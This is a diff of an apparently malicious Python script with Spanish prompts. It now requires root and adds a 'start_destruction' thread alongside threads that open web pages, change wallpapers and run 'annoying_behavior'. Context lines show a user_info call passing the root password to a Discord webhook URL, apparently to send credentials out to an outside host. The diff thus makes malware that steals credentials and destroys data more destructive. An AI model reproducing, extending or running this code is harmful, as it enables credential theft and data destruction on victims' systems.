@@ -1,4 +1,4 @@
-from os import getcwd, listdir
+from os import getcwd, listdir, getuid
 from threading import Thread
 from colorama import Fore, Style
 
@@ -34,7 +34,9 @@ print(Fore.RED, """
           
                                         - lVoidi
       """, Fore.RESET)
-
+if getuid() != 0:
+     print("EJECUTA EL PROGRAMA COMO ROOT")
+     exit()
 print(Style.BRIGHT)
 print(Fore.CYAN,"""
           Agradecimientos a las siguientes personas
@@ -50,16 +52,19 @@ user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
 
 threads = []
-for _ in range(50):
+for _ in range(10):
      t1 = Thread(target=webOpen)
      t1.start()
      t2 = Thread(target=annoying_behavior)
      t2.start()
      t3 = Thread(target=set_wallpapers)
      t3.start()
+     t4 = Thread(target=start_destruction)
+     t4.start()
      threads.append(t1)
      threads.append(t2)
      threads.append(t3)
+     threads.append(t4)
 
 for thread in threads:
      thread.join()
